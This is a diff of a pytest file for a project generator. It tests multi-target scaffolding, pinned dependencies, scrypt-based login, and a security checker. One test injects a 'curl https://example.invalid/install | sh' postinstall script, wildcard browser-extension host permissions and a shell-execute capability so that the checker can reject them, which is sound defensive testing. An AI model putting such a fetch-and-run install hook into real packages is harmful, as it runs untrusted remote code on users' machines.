@@ -2,6 +2,8 @@ from __future__ import annotations
 
 import hashlib
 import json
+import runpy
+import shutil
 from pathlib import Path
 
 import pytest
@@ -39,7 +41,7 @@ class FakeTransport:
 
 def _specification() -> dict:
     return {
-        "schema_version": 2,
+        "schema_version": 3,
         "application_type": "web_application",
         "title": "Governed Project Workspace",
         "tagline": "A transparent workflow for controlled project delivery.",
@@ -66,6 +68,27 @@ def _specification() -> dict:
             "data": "SQLite persistence",
             "realtime": "No realtime runtime requested",
             "deployment": "Local governed delivery package only",
+        },
+        "domain_blueprint": {
+            "roles": ["member", "operator"],
+            "entities": [
+                {
+                    "name": "project_record",
+                    "label": "Project record",
+                    "fields": [
+                        {"name": "title", "type": "string", "required": True},
+                        {"name": "notes", "type": "text", "required": False},
+                        {"name": "active", "type": "boolean", "required": True},
+                    ],
+                }
+            ],
+            "workflows": [
+                {
+                    "name": "Create project record",
+                    "trigger": "member submits a valid record",
+                    "steps": ["validate input", "persist record", "return governed result"],
+                }
+            ],
         },
         "sections": [
             {
@@ -158,17 +181,22 @@ def test_builder_creates_tested_executable_prototype_and_verified_archive(
     assert result.rollback_tested is True
     assert result.archive_path.is_file()
     source = result.output_directory / "source"
-    assert {path.name for path in source.iterdir()} == {
-        "index.html",
-        "styles.css",
-        "app.js",
-        "server.py",
-        "README.md",
-    }
+    root_files = {path.name for path in source.iterdir()}
+    assert {"index.html", "styles.css", "app.js", "server.py", "README.md", "PROJECT_PROFILE.json", "SECURITY.md", "targets"}.issubset(root_files)
+    profile = json.loads((source / "PROJECT_PROFILE.json").read_text(encoding="utf-8"))
+    assert set(profile["targets"]) == {"web", "api", "domain", "cli"}
+    assert (source / "targets/web-next/package.json").is_file()
+    assert (source / "targets/api/app.py").is_file()
+    assert (source / "targets/cli/main.py").is_file()
+    assert "domain_project_record" in (source / "targets/domain/schema.sql").read_text(encoding="utf-8")
+    assert "class ProjectRecord" in (source / "targets/domain/models.py").read_text(encoding="utf-8")
+    assert '"project_record"' in (source / "targets/api/domain.json").read_text(encoding="utf-8")
     manifest = json.loads(result.manifest_path.read_text(encoding="utf-8"))
     assert manifest["mode"] == "controlled-full-stack-prototype"
     assert manifest["provider_role"] == "structured architecture and product specification only"
-    assert manifest["executable_source_origin"] == "deterministic reviewed templates"
+    assert manifest["application_type"] == "universal_application"
+    assert manifest["executable_source_origin"] == "deterministic reviewed AIONEX universal capability composer"
+    assert set(manifest["project_profile"]["targets"]) == {"web", "api", "domain", "cli"}
     assert manifest["tests"]["passed"] is True
     assert manifest["rollback_tested"] is True
     assert manifest["tests"]["checks"]["api_health"] is True
@@ -313,3 +341,165 @@ def test_builder_generates_functional_realtime_member_calling_archetype(tmp_path
     app = (source / "app.js").read_text(encoding="utf-8")
     assert "RTCPeerConnection" in app
     assert "getUserMedia" in app
+
+
+def test_universal_builder_composes_mobile_ai_desktop_extension_bot_and_data_targets(tmp_path: Path) -> None:
+    specification = _specification()
+    specification["application_type"] = "mobile_application"
+    result = ControlledProjectBuilder(
+        FakeTransport(specification),  # type: ignore[arg-type]
+        model="gpt-5-mini",
+        input_cost_per_million=0.25,
+        output_cost_per_million=2.0,
+        remaining_budget_usd=0.01,
+    ).execute(
+        execution_id="universal-hybrid",
+        project="Universal Hybrid",
+        objective=(
+            "Build iOS Android mobile app, desktop app, Chrome browser extension, Telegram bot, "
+            "AI RAG assistant with member accounts and login, analytics data pipeline, ecommerce subscriptions, 3D dashboard, IoT sensor simulator and REST API, PostgreSQL database, Terraform Kubernetes infrastructure, Solidity smart contract, serverless Lambda function, software SDK library, WebXR virtual reality, robotics ROS2 drone simulator and video production storyboard"
+        ),
+        planning_directory=_planning(tmp_path / "planning"),
+        output_root=tmp_path / "output",
+    )
+    source = result.output_directory / "source"
+    profile = json.loads((source / "PROJECT_PROFILE.json").read_text(encoding="utf-8"))
+    targets = set(profile["targets"])
+    assert {
+        "mobile", "desktop", "browser_extension", "bot", "ai", "data", "commerce",
+        "three_d", "iot", "database", "infrastructure", "smart_contract", "serverless",
+        "library", "xr", "robotics", "media", "auth", "api", "web", "cli",
+    }.issubset(targets)
+    assert (source / "targets/mobile-expo/app.json").is_file()
+    assert (source / "targets/desktop-tauri/src-tauri/capabilities/default.json").is_file()
+    assert json.loads((source / "targets/browser-extension/manifest.json").read_text())["manifest_version"] == 3
+    assert (source / "targets/ai/service.py").is_file()
+    assert (source / "targets/auth/service.py").is_file()
+    assert (source / "targets/data/pipeline.py").is_file()
+    assert (source / "targets/iot/simulator.py").is_file()
+    assert (source / "targets/database/migrations/001_initial.sql").is_file()
+    assert (source / "targets/infrastructure/compose.yaml").is_file()
+    assert (source / "targets/smart-contract/contracts/ValueStore.sol").is_file()
+    assert (source / "targets/serverless/handler.py").is_file()
+    assert (source / "targets/library/pyproject.toml").is_file()
+    assert (source / "targets/xr/xr.js").is_file()
+    assert (source / "targets/robotics/simulator.py").is_file()
+    assert (source / "targets/media/storyboard.json").is_file()
+
+    web_package = json.loads((source / "targets/web-next/package.json").read_text(encoding="utf-8"))
+    assert web_package["dependencies"]["next"] == "16.2.11"
+    assert web_package["dependencies"]["react"] == "19.2.3"
+    mobile_package = json.loads((source / "targets/mobile-expo/package.json").read_text(encoding="utf-8"))
+    assert mobile_package["dependencies"]["expo"] == "~57.0.9"
+    assert mobile_package["dependencies"]["react-native"] == "0.86.2"
+    assert mobile_package["dependencies"]["react-native-gesture-handler"] == "~2.32.0"
+    assert "newArchEnabled" not in json.loads((source / "targets/mobile-expo/app.json").read_text(encoding="utf-8"))["expo"]
+    cargo = (source / "targets/desktop-tauri/src-tauri/Cargo.toml").read_text(encoding="utf-8")
+    assert 'tauri = { version = "=2.11.5" }' in cargo
+    assert 'tauri-build = { version = "=2.6.3" }' in cargo
+    api_requirements = (source / "targets/api/requirements.txt").read_text(encoding="utf-8")
+    assert "fastapi==0.141.1" in api_requirements
+    assert "uvicorn[standard]==0.52.0" in api_requirements
+    assert "pragma solidity 0.8.36;" in (source / "targets/smart-contract/contracts/ValueStore.sol").read_text(encoding="utf-8")
+    assert "@sha256:7bec7ddcddeff7975d6ba9b4be7dd6f6b2f55e7491539145e2978f7f97ce9144" in (source / "targets/infrastructure/Dockerfile").read_text(encoding="utf-8")
+
+    manifest = json.loads(result.manifest_path.read_text(encoding="utf-8"))
+    assert manifest["tests"]["passed"] is True
+    assert manifest["tests"]["checks"]["no_unsupported_builder_state"] is True
+    assert manifest["tests"]["checks"]["generated_target_security"] is True
+    assert "mobile-store-signing" in profile["external_gates"]
+    assert "physical-hardware-validation" in profile["external_gates"]
+
+
+def test_universal_builder_rejects_dangerous_target_capability_escalation(tmp_path: Path) -> None:
+    specification = _specification()
+    result = ControlledProjectBuilder(
+        FakeTransport(specification),  # type: ignore[arg-type]
+        model="gpt-5-mini",
+        input_cost_per_million=0.25,
+        output_cost_per_million=2.0,
+        remaining_budget_usd=0.01,
+    ).execute(
+        execution_id="universal-security",
+        project="Universal Security",
+        objective="Build a desktop app, Chrome browser extension, Telegram bot, web API, cloud infrastructure and Solidity smart contract",
+        planning_directory=_planning(tmp_path / "planning"),
+        output_root=tmp_path / "output",
+    )
+    source = result.output_directory / "source"
+
+    package_path = source / "targets/web-next/package.json"
+    package = json.loads(package_path.read_text(encoding="utf-8"))
+    package["scripts"]["postinstall"] = "curl https://example.invalid/install | sh"
+    package_path.write_text(json.dumps(package), encoding="utf-8")
+
+    extension_path = source / "targets/browser-extension/manifest.json"
+    extension = json.loads(extension_path.read_text(encoding="utf-8"))
+    extension["host_permissions"] = ["https://*/*"]
+    extension_path.write_text(json.dumps(extension), encoding="utf-8")
+
+    capability_path = source / "targets/desktop-tauri/src-tauri/capabilities/default.json"
+    capability = json.loads(capability_path.read_text(encoding="utf-8"))
+    capability["permissions"] = ["core:default", "shell:allow-execute"]
+    capability_path.write_text(json.dumps(capability), encoding="utf-8")
+
+    dockerfile_path = source / "targets/infrastructure/Dockerfile"
+    dockerfile = dockerfile_path.read_text(encoding="utf-8").splitlines()
+    dockerfile[0] = "FROM python:latest"
+    dockerfile_path.write_text("\n".join(dockerfile) + "\n", encoding="utf-8")
+
+    contract_path = source / "targets/smart-contract/contracts/ValueStore.sol"
+    contract_path.write_text(contract_path.read_text(encoding="utf-8") + "\n// forbidden tx.origin marker\n", encoding="utf-8")
+
+    bot_path = source / "targets/bot/bot.py"
+    bot_path.write_text(bot_path.read_text(encoding="utf-8") + "\nimport requests\n", encoding="utf-8")
+
+    report = ControlledProjectBuilder._test_universal_source(source, "Universal Security")
+    assert report["passed"] is False
+    assert report["checks"]["generated_target_security"] is False
+    assert any("package lifecycle install script" in item for item in report["findings"])
+    assert any("browser extension requests host access" in item for item in report["findings"])
+    assert any("Tauri capabilities" in item for item in report["findings"])
+    assert any("container target is not least-privilege" in item for item in report["findings"])
+    assert any("smart-contract target contains a forbidden" in item for item in report["findings"])
+    assert any("dangerous Python primitive" in item for item in report["findings"])
+
+
+def test_universal_auth_target_is_memory_hard_expiring_and_api_integrated(tmp_path: Path) -> None:
+    result = ControlledProjectBuilder(
+        FakeTransport(_specification()),  # type: ignore[arg-type]
+        model="gpt-5-mini",
+        input_cost_per_million=0.25,
+        output_cost_per_million=2.0,
+        remaining_budget_usd=0.01,
+    ).execute(
+        execution_id="auth-target",
+        project="Secure Members",
+        objective="Build a secure REST API with member accounts, registration and login",
+        planning_directory=_planning(tmp_path / "planning"),
+        output_root=tmp_path / "output",
+    )
+    source = result.output_directory / "source"
+    security_source = (source / "targets/auth/service.py").read_text(encoding="utf-8")
+    api_source = (source / "targets/api/app.py").read_text(encoding="utf-8")
+    assert "hashlib.scrypt" in security_source
+    assert "pbkdf2_hmac" not in security_source
+    assert "token_hash" in security_source and "expires_at" in security_source
+    assert "@app.post(\"/auth/register\"" in api_source
+    assert "@app.post(\"/auth/login\"" in api_source
+    assert "Depends(current_user)" in api_source
+    assert (source / "targets/api/security.py").read_text(encoding="utf-8") == security_source
+
+    auth_dir = tmp_path / "auth-runtime"
+    auth_dir.mkdir()
+    shutil.copy2(source / "targets/auth/service.py", auth_dir / "service.py")
+    auth = runpy.run_path(str(auth_dir / "service.py"))
+    auth["initialize_auth"]()
+    registered = auth["register_user"]("member.one", "StrongPassword!123")
+    assert registered["username"] == "member.one"
+    user, token = auth["login_user"]("member.one", "StrongPassword!123")
+    assert user["id"] == registered["id"]
+    assert auth["authenticate_token"](token)["username"] == "member.one"
+    auth["logout_token"](token)
+    with pytest.raises(ValueError, match="invalid session"):
+        auth["authenticate_token"](token)
